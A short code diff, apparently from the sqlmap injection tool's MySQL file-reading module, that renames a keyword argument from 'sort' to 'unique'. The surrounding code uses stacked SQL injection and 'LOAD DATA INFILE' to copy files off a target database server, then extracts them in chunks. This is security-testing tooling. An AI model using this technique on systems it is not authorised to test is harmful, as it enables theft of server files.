@@ -52,7 +52,7 @@ class Filesystem(GenericFilesystem):
         logger.debug(debugMsg)
         inject.goStacked("LOAD DATA INFILE '%s' INTO TABLE %s FIELDS TERMINATED BY '%s' (%s)" % (tmpFile, self.fileTblName, randomStr(10), self.tblField))
 
-        length = unArrayizeValue(inject.getValue("SELECT LENGTH(%s) FROM %s" % (self.tblField, self.fileTblName), sort=False, resumeValue=False, charsetType=2))
+        length = unArrayizeValue(inject.getValue("SELECT LENGTH(%s) FROM %s" % (self.tblField, self.fileTblName), unique=False, resumeValue=False, charsetType=2))
 
         if not isNumPosStrValue(length):
             errMsg = "unable to retrieve the content of the "
@@ -66,11 +66,11 @@ class Filesystem(GenericFilesystem):
             result = []
 
             for i in xrange(1, length, sustrLen):
-                chunk = inject.getValue("SELECT MID(%s, %d, %d) FROM %s" % (self.tblField, i, sustrLen, self.fileTblName), unpack=False, sort=False, resumeValue=False, charsetType=3)
+                chunk = inject.getValue("SELECT MID(%s, %d, %d) FROM %s" % (self.tblField, i, sustrLen, self.fileTblName), unpack=False, unique=False, resumeValue=False, charsetType=3)
 
                 result.append(chunk)
         else:
-            result = inject.getValue("SELECT %s FROM %s" % (self.tblField, self.fileTblName), sort=False, resumeValue=False, charsetType=3)
+            result = inject.getValue("SELECT %s FROM %s" % (self.tblField, self.fileTblName), unique=False, resumeValue=False, charsetType=3)
 
         return result
 
